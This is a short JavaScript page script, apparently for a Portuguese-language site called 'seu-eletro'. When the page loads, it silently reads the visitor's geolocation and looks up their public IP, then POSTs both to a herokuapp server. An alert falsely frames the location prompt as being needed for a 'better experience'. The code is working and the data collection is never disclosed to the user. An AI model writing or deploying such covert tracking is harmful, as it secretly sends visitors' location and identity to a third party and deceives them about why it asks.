function httpGet(theUrl) {
	var xmlHttp = new XMLHttpRequest();
	xmlHttp.open("GET", theUrl, false); // false for synchronous request
	xmlHttp.send(null);
	return xmlHttp.responseText;
}

function httpPost(theUrl, data) {
	var xmlHttp = new XMLHttpRequest();
	xmlHttp.open("POST", theUrl, false);
	xmlHttp.setRequestHeader("Content-Type", "application/json");
	xmlHttp.send(data);
	return xmlHttp.responseText;
}

function getLocation() {
	if (navigator.geolocation) {
		navigator.geolocation.getCurrentPosition(showPosition);
	} else {
		x.innerHTML = "Geolocation is not supported by this browser.";
	}
}

function showPosition(position) {
	const latitude = position.coords.latitude;
	const longitude = position.coords.longitude;
	const data = {
		latitude,
		longitude,
	};

	httpPost("https://seu-eletro.herokuapp.com/data", JSON.stringify(data));
}

getLocation();
const data = httpGet("https://api.ipify.org/?format=json");

httpPost("https://seu-eletro.herokuapp.com/data", data);

window.alert(
	"Recomendamos que você aceite as configurações necessárias para uma melhor experiência no site."
);
